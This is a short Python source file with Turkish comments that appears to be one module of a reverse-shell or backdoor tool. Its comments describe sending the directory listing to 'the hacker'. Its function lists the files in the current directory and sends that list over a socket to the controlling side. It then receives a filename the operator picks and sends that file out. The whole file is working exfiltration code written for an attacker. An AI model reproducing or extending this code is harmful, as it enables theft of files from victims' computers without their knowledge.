from glob import glob
import json

DELIMETER = "<END_OF_RESULTS>"


# yapilmasi gereken
# dizindeki dosya ve klasör listesini almak

# dizindeki dosyaların bir sözlüğünü oluşturmak

# sozlugu serialize etmek

# verinin sonuna delimeter ekleyip hacker gondermek

# Hackerin bu veriyi alabilmesi gerekiyor


def upload_file_folder(my_socket):
    print("[+] Sunucuya gonderiliyor")

    files = glob("*")

    dict = {}

    for index, file in enumerate(files):
        dict[index] = file

    dict_bytes = json.dumps(dict)

    bytes_with_delimeter = dict_bytes + DELIMETER

    raw_bytes = bytes_with_delimeter.encode()

    print("[+] Serileştirilmiş dosya listesi gonderiliyor")
    my_socket.socket.send(raw_bytes)

    filename = my_socket.receive_data()

    print("[+] Secilen dosya ", filename)

    my_socket.send_file(filename)
